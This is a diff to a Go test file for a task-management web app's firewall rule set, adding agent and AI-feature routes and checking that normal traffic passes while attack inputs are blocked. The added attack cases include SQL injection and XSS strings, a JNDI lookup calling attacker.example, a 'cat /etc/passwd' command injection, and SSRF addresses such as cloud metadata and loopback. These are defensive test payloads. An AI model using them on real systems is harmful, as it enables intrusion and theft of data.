@@ -146,9 +146,12 @@ func (g td) goal() map[string]any {
 }
 
 // tdRequest is one request of the client's. upload names a file sent as
-// a form's part, and access is a share's access token.
+// a form's part, and access is a share's access token. header holds an
+// agent's headers, which sends it with its token in place of the
+// session.
 type tdRequest struct {
 	method, path, body, upload, access string
+	header                             map[string]string
 }
 
 func tdGet(path string) tdRequest         { return tdRequest{method: "GET", path: path} }
@@ -265,8 +268,11 @@ func (g td) requests() []tdRequest {
 // tdRoutes are the server's routes, every one, whose paths CRS reads for
 // commands since 4.30.
 const tdRoutes = `
+DELETE /api/v1/admin/ai/providers/{id}
 DELETE /api/v1/admin/invites/{id}
 DELETE /api/v1/admin/users/{id}
+DELETE /api/v1/ai/jobs/{id}
+DELETE /api/v1/ai/keys/{kind}
 DELETE /api/v1/attachments/{id}
 DELETE /api/v1/auth/me
 DELETE /api/v1/auth/passkeys/{id}
@@ -280,14 +286,21 @@ DELETE /api/v1/journal/notes/{id}
 DELETE /api/v1/labels/{id}
 DELETE /api/v1/push/subscriptions/{id}
 DELETE /api/v1/reminders/{id}
+DELETE /api/v1/reviews
+DELETE /api/v1/reviews/{id}
 DELETE /api/v1/shares/{id}
 DELETE /api/v1/spaces/{id}
 DELETE /api/v1/spaces/{id}/invitations/{invId}
 DELETE /api/v1/spaces/{id}/join-links/{linkId}
 DELETE /api/v1/spaces/{id}/members/{userId}
 DELETE /api/v1/tasks/{id}
+DELETE /api/v1/tasks/{id}/nudge
 DELETE /api/v1/tasks/{id}/reminders/mute
+DELETE /api/v1/tokens/{id}
 DELETE /api/v1/trash/{id}
+GET /api/v1/admin/agent-access
+GET /api/v1/admin/ai
+GET /api/v1/admin/ai/users
 GET /api/v1/admin/audit
 GET /api/v1/admin/audit/events
 GET /api/v1/admin/backups
@@ -297,6 +310,9 @@ GET /api/v1/admin/status
 GET /api/v1/admin/storage
 GET /api/v1/admin/users
 GET /api/v1/admin/users/{id}/deletion
+GET /api/v1/ai/jobs/{id}
+GET /api/v1/ai/status
+GET /api/v1/ai/usage
 GET /api/v1/attachments/{id}
 GET /api/v1/attachments/{id}/thumb
 GET /api/v1/auth/me
@@ -316,6 +332,7 @@ GET /api/v1/journal/days/{date}
 GET /api/v1/notifications
 GET /api/v1/notifications/count
 GET /api/v1/notify/prefs
+GET /api/v1/nudges
 GET /api/v1/public/join/{token}
 GET /api/v1/public/shares/{token}/attachments/{id}
 GET /api/v1/public/shares/{token}/attachments/{id}/thumb
@@ -325,12 +342,14 @@ GET /api/v1/public/shares/{token}/tree
 GET /api/v1/push/subscriptions
 GET /api/v1/push/vapid
 GET /api/v1/ready
+GET /api/v1/reviews/current
 GET /api/v1/search
 GET /api/v1/shares
 GET /api/v1/shares/{id}/access
 GET /api/v1/spaces
 GET /api/v1/spaces/{id}
 GET /api/v1/spaces/{id}/activity
+GET /api/v1/spaces/{id}/ai-policy
 GET /api/v1/spaces/{id}/export.md
 GET /api/v1/spaces/{id}/invitations
 GET /api/v1/spaces/{id}/join-links
@@ -346,12 +365,17 @@ GET /api/v1/tasks/{id}/comments
 GET /api/v1/tasks/{id}/habit-stats
 GET /api/v1/tasks/{id}/journal
 GET /api/v1/tasks/{id}/reminders
+GET /api/v1/tokens
 GET /api/v1/trash
 GET /api/v1/views/counts
 GET /api/v1/views/done
 GET /api/v1/views/goals
 GET /api/v1/views/horizon
 GET /api/v1/views/today
+PATCH /api/v1/admin/agent-access
+PATCH /api/v1/admin/ai
+PATCH /api/v1/admin/ai/providers/{id}
+PATCH /api/v1/admin/ai/users/{id}
 PATCH /api/v1/admin/settings
 PATCH /api/v1/admin/users/{id}
 PATCH /api/v1/auth/me
@@ -365,11 +389,17 @@ PATCH /api/v1/shares/{id}
 PATCH /api/v1/spaces/{id}
 PATCH /api/v1/spaces/{id}/members/{userId}
 PATCH /api/v1/tasks/{id}
+POST /api/v1/admin/ai/providers
+POST /api/v1/admin/ai/providers/{id}/test
 POST /api/v1/admin/backups
 POST /api/v1/admin/invites
 POST /api/v1/admin/smtp/test
 POST /api/v1/admin/users/{id}/mfa/reset
 POST /api/v1/admin/users/{id}/password-reset
+POST /api/v1/ai/capture/break-down
+POST /api/v1/ai/capture/jabber
+POST /api/v1/ai/review/briefing
+POST /api/v1/ai/review/weekly
 POST /api/v1/attention/{id}/dismiss
 POST /api/v1/auth/email/resend
 POST /api/v1/auth/email/verify
@@ -405,6 +435,7 @@ POST /api/v1/invitations/{id}/accept
 POST /api/v1/invitations/{id}/decline
 POST /api/v1/join/{token}
 POST /api/v1/journal/notes
+POST /api/v1/mcp
 POST /api/v1/notifications/read
 POST /api/v1/own/{id}
 POST /api/v1/public/shares/{token}/open
@@ -419,12 +450,14 @@ POST /api/v1/spaces/{id}/labels
 POST /api/v1/spaces/{id}/restore
 POST /api/v1/spaces/{id}/transfer
 POST /api/v1/tasks
+POST /api/v1/tasks/similar
 POST /api/v1/tasks/{id}/attachments
 POST /api/v1/tasks/{id}/cancel
 POST /api/v1/tasks/{id}/checkins
 POST /api/v1/tasks/{id}/comments
 POST /api/v1/tasks/{id}/complete
 POST /api/v1/tasks/{id}/move
+POST /api/v1/tasks/{id}/nudge/pause
 POST /api/v1/tasks/{id}/reminders
 POST /api/v1/tasks/{id}/reminders/mute
 POST /api/v1/tasks/{id}/reopen
@@ -432,12 +465,18 @@ POST /api/v1/tasks/{id}/restore
 POST /api/v1/tasks/{id}/skip
 POST /api/v1/tasks/{id}/snooze
 POST /api/v1/tasks/{id}/undo
+POST /api/v1/tokens
 POST /api/v1/trash/empty
+PUT /api/v1/ai/keys/{kind}
+PUT /api/v1/ai/settings
 PUT /api/v1/day-plan/{date}
 PUT /api/v1/focus
 PUT /api/v1/journal/days/{date}
 PUT /api/v1/own/{id}
+PUT /api/v1/reviews/{id}/feedback
+PUT /api/v1/spaces/{id}/ai-policy
 PUT /api/v1/tasks/{id}/assignees
+PUT /api/v1/tasks/{id}/nudge
 `
 
 // routes is a request to each of the server's routes, with ids, dates and
@@ -508,8 +547,13 @@ func tdSend(t *testing.T, addr string, r tdRequest, cookie string) int {
 	}
 	req.Header.Set("Accept", "application/json")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0")
-	req.Header.Set("X-Tendril-Client", hex.EncodeToString([]byte(cookie[:16])))
-	req.Header.Set("Cookie", "__Host-tendril_session="+cookie)
+	if r.header == nil {
+		req.Header.Set("X-Tendril-Client", hex.EncodeToString([]byte(cookie[:16])))
+		req.Header.Set("Cookie", "__Host-tendril_session="+cookie)
+	}
+	for k, v := range r.header {
+		req.Header.Set(k, v)
+	}
 	if r.access != "" {
 		req.Header.Set("X-Share-Access", r.access)
 	}
@@ -583,6 +627,37 @@ func TestTheTendrilsSetLetsItsClientThrough(t *testing.T) {
 				for _, r := range g.passwordRequests() {
 					send(r, "")
 				}
+				for _, r := range append(append(g.mcpRequests(false), g.mcpRequests(true)...), g.aiRequests()...) {
+					send(r, "")
+				}
+			}
+			// What an agent writes, as a title, notes, an addition to them
+			// and a search, the longest each takes, and many tokens.
+			for _, text := range append(tdTitles, tdAgentText[:2]...) {
+				send(g.tool(false, "create_task", map[string]any{"title": text}), " (an agent)")
+				send(g.tool(true, "update_task", map[string]any{"task_id": g.id(), "version": 2, "title": text}), " (an agent)")
+			}
+			for _, text := range append(tdAgentText, tdProse...) {
+				send(g.tool(false, "create_task", map[string]any{"title": "x", "notes": text}), " (an agent)")
+				send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 2, "notes_append": text}), " (an agent)")
+				send(tdBody("POST", "/api/v1/ai/capture/break-down", map[string]any{"task_id": g.id(), "hint": text}), "")
+			}
+			for _, q := range tdSearches {
+				send(g.tool(false, "search_tasks", map[string]any{"query": q}), " (an agent)")
+			}
+			long := []rune(strings.Repeat(strings.Join(tdAgentText, "\n\n")+"\n\n", 80))
+			send(g.tool(false, "update_task", map[string]any{"task_id": g.id(), "version": 9, "notes_append": string(long[:4000])}), " (4,000 characters)")
+			send(g.tool(false, "create_task", map[string]any{"title": "x", "notes": string(long[:20000])}), " (20,000 characters)")
+			for range 500 {
+				send(g.mcp(false, "ping", nil), " (a token)")
+			}
+			// Sessions whose token spells SQL, a comment or a hex number,
+			// as one in five thousand does.
+			for _, cookie := range []string{"4--cMnZjgKkDWYohOPzX_MSZ6bRiLm73fOqOBCuutxc", "7--hpHwzg3dELkfXDlpwH6W-MZX3zd9sZmgsRpW-TRk",
+				"nB10yjgIF2-0x9eciysImNJe75pvImDf0hhYXbBZHzg", "Xm99haEdCG1-7TAf2YbFmzNFwWHlrPixf5oR77-Sj48", "N1jxdo3Y8m9ESi3yfUbFzrvSsyha3oR7-itM1RaspE0"} {
+				if status := tdSend(t, plain, tdGet("/api/v1/views/counts?tz=UTC"), cookie); status != http.StatusOK {
+					t.Errorf("the session %s: %d", cookie, status)
+				}
 			}
 			// A passkey's answer and the push keys are random, and so is
 			// the session in the cookie, so many of each.
@@ -634,6 +709,15 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, tdGet(api + "/search" + tdQuery("q", "x' UNION SELECT password FROM users--"))},
 		{1, tdBody("POST", api+"/import/tasks", map[string]any{"space_id": space, "source": "todoist", "items": []any{
 			map[string]any{"kind": "task", "title": "x", "notes": "1' OR '1'='1' --", "comments": []string{"<script>alert(1)</script>"}}}})},
+		{1, g.tool(false, "create_task", map[string]any{"title": "<script>alert(document.cookie)</script>"})},
+		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "notes_append": "x' UNION SELECT password FROM users--"})},
+		{1, g.tool(true, "search_tasks", map[string]any{"query": "1' OR '1'='1' --"})},
+		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
+		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
+		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries, then <script>alert(1)</script>", "space_ids": []string{space}})},
+		{1, tdBody("POST", api+"/ai/capture/break-down", map[string]any{"task_id": task, "hint": "1' OR '1'='1' --"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "label": "<img src=x onerror=alert(1)>"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "extra": map[string]any{"stop": "x' UNION SELECT password FROM users--"}})},
 	}
 	attacks := []tdAttack{
 		// Without a character only the rules that count them see. Where
@@ -684,6 +768,55 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		// them everywhere, so every other attack here is a GET or a POST.
 		{1, tdRequest{method: "PUT", path: "/today"}},
 		{1, tdRequest{method: "DELETE", path: "/assets/index.js"}},
+		// An agent's arguments are ids, numbers, dates and words, and its
+		// metadata only what the protocol names. A call's id is named like
+		// the id command, which CRS alone refuses from paranoia 3; a
+		// notification has none.
+		{3, g.tool(false, "get_task", map[string]any{"task_id": "a);(b"})},
+		{3, g.tool(true, "list_tasks", map[string]any{"space_id": "a);(b"})},
+		{4, g.mcp(true, "notifications/cancelled", map[string]any{"requestId": "a);(b"})},
+		{1, g.tool(false, "move_task", map[string]any{"task_id": task, "parent_id": "1' OR '1'='1"})},
+		{3, g.tool(false, "search_tasks", map[string]any{"query": "milk", "kinds": []string{"task", "a);(b"}})},
+		{1, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "due": "2026-10-13' AND SLEEP(5)--"})},
+		{1, g.tool(false, "move_task", map[string]any{"task_id": task, "position": "last;cat /etc/passwd"})},
+		{1, g.tool(false, "get_task", map[string]any{"task_id": task, "x' OR 1=1--": 1})},
+		{3, g.mcp(false, "ping", map[string]any{"_meta": map[string]any{"com.example/trace": "a);(b"}})},
+		{4, g.mcp(false, "notifications/initialized", map[string]any{"_meta": map[string]any{"com.example/trace": "a);(b"}})},
+		{4, g.mcp(false, "notifications/initialized", map[string]any{"_meta": map[string]any{"com.example/a);(b": 1}})},
+		{1, g.mcp(false, "tools/call' UNION SELECT password FROM users--", nil)},
+		// The same with only brackets, which fewer rules read.
+		{3, g.tool(false, "update_task", map[string]any{"task_id": task, "version": 2, "due": "2026-10-13);("})},
+		{2, g.tool(false, "move_task", map[string]any{"task_id": task, "position": "last)"})},
+		{4, g.mcp(true, "notifications/initialized);(", nil)},
+		// The AI features' ids and settings are ids and words, a model's
+		// name has a shape, and a provider's address is a link with a host
+		// by name or IPv4 address, one of it, where a provider goes; a
+		// loopback or cloud metadata address is read everywhere.
+		{4, tdBody("POST", api+"/ai/review/weekly", map[string]any{"job_id": "a);(b"})},
+		{4, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "milk", "space_ids": []string{space, "a);(b"}})},
+		{1, tdBody("POST", api+"/ai/review/briefing", map[string]any{"job_id": task, "preferred": "instance.x' OR '1'='1"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "models": map[string]any{"fast": "llama' OR 1=1--"}})},
+		{4, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "models": map[string]any{"smart": "a);(b"}})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://169.254.169.254/latest/meta-data/"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://localhost:11434/v1"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://127.0.0.1:11434/v1"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://127.0.0.2:11434/v1"})},
+		{2, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://0177.0.0.1:11434/v1"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://2130706433:11434/v1"})},
+		{2, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://localhost:11434/v1"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://ollama.localhost/v1"})},
+		{2, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://llm.example.com/v1?x=a);(b"})},
+		{4, tdBody("POST", api+"/ai/review/briefing", map[string]any{"job_id": task, "preferred": "instance.a);(b"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "file:///etc/passwd"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://[2001:db8::10]:11434/v1"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "http://192.0.2.9:11434/v1?next=x"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "base_url": "https://llm.example.com/v1?x=' OR 1=1--"})},
+		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"base_url": "https://llm.example.com/v1", "Base_URL": "http://192.0.2.9/x"})},
+		{1, tdBody("POST", api+"/spaces", map[string]any{"name": "Home", "base_url": "http://192.0.2.9/x"})},
+		// A key is unread only where one goes.
+		{1, tdBody("POST", api+"/tasks/"+task+"/comments", map[string]any{"body": "x", "key": "x' UNION SELECT password FROM users--"})},
+		{1, tdBody("POST", api+"/ai/keys/openai", map[string]any{"api_key": "x' UNION SELECT password FROM users--"})},
+		{1, tdBody("POST", api+"/admin/ai/providers/"+g.id()+"/test", map[string]any{"api_key": "x' UNION SELECT password FROM users--"})},
 	}
 	// The subtests run at once, so nothing draws from g inside them.
 	session := g.token()
